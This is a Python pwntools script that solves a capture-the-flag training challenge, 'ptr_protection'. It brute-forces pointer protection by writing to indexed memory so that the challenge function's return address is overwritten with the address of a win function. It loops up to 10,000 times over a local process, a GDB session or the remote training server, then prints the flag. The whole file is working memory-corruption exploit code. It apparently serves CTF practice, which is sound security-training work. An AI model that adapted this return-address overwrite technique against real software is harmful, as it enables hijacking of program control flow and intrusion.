# works 
from tqdm import *
import re
from pwn import *
CHALL_PATH = "./ptr_protection"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
brva 0x13DE
c
brva 0x140E
c
"""

for i in tqdm(range(10_000)):
    if args.REMOTE:
        p = remote("ptr-protection.training.offensivedefensive.it", 8080, ssl=True)
    elif args.GDB:
        p = gdb.debug(CHALL_PATH, COMMANDS)
    else:
        p = process(CHALL_PATH)

    # 40 is the position of the return address of challenge function
    index = b"40"
    # 0x7c is the lsb of the win return address
    data = b"124" #0x7c
    p.recvuntil(b"Enter index: ")
    p.sendline(index)
    p.recvuntil(b"Enter data: ")
    p.sendline(data)

    #guessing 7th byte of chall ret address
    byte_7_chall_ret_addr = 0x15
    byte_7_win_addr = 0x12

    seventh_byte_canary = random.randint(0, 255)^byte_7_chall_ret_addr
    index = b"41"
    data = seventh_byte_canary ^ byte_7_win_addr
    print(hex(data))
    p.recvuntil(b"Enter index: ")
    p.sendline(index)
    p.recvuntil(b"Enter data: ")
    p.sendline(str(data).encode())
    p.recvuntil(b"Enter index: ")

    p.sendline(b"-1")
    try:
        output = p.recvuntil(b"WIN!")
        print("WIN")
        print("here is the flag: ")
        print(p.recvuntil(b"}"))
        break
    except Exception as e:
        print(e)
    finally:
        pass
    p.close()

